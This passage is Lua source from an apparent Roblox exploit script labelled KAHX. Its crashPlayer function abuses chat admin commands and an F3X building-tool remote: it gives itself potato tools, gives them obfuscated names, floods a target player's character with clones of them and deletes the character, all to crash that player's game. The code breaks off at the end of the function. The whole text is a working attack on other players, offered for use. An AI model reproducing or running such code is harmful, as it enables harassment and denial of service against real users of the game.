-- =====================================================================
-- \\ Crash (potato flood) // --
-- pauseLoops handling (fix #7): saves the previous value and restores
-- it on EVERY exit path, so overlapping crash + kick operations cannot
-- leave the monitor loops permanently frozen.
-- =====================================================================
local function crashPlayer(pl)
    if not pl then return end
    local u = pl.UserId
    local n = os.clock()
    if S.lastCrashTime[u] and (n - S.lastCrashTime[u]) < 0.05 then return end
    S.lastCrashTime[u] = n
    local prevPause = S.pauseLoops
    S.pauseLoops = true
    task.spawn(function()
        chatSystem("gear me,me,me potato")
        task.wait(1.5)
        local bp = LocalPlayer:FindFirstChild("Backpack")
        local ch = LocalPlayer.Character
        if not ch then
            S.pauseLoops = prevPause
            return
        end
        local function findPotatoes(c)
            local found = {}
            if not c then return found end
            for _, t in ipairs(c:GetChildren()) do
                if t:IsA("Tool") and (string.find(t.Name, "Potato") or t.Name == "HotPotato") then
                    table.insert(found, t)
                end
            end
            return found
        end
        local tools = {}
        local w = 0
        while #tools == 0 and w < 5 do
            tools = findPotatoes(bp)
            for _, p in ipairs(findPotatoes(ch)) do table.insert(tools, p) end
            if #tools == 0 then task.wait(0.1) w = w + 0.1 end
        end
        if #tools == 0 then
            S.pauseLoops = prevPause
            notify("Crash", "Failed to get potato tools", 3)
            return
        end
        local ct = os.clock()
        for _, t in ipairs(tools) do
            f3x({"SetName", {t}, getObfName()})
        end
        if pl.Character then
            chatSystem("blind " .. pl.Name)
            chatSystem("size " .. pl.Name .. " nan")
            for _ = 1, 4 do
                if not pl.Parent or not pl.Character then break end
                f3x({"Clone", table.create(#tools * 3, tools[1]), pl.Character})
                task.wait(0.15)
            end
            if pl.Character then
                f3x({"Remove", {pl.Character}})
            end
        end
        for _, t in ipairs(tools) do
            if t.Parent then f3x({"Remove", {t}}) end
        end
        S.pauseLoops = prevPause
        local ft = tostring(math.floor((os.clock() - ct) * 1000))
        notify("Crashed " .. pl.DisplayName, ft .. "ms", 3)
        print("[KAHX] Crashed " .. pl.DisplayName .. " in " .. ft .. "ms")
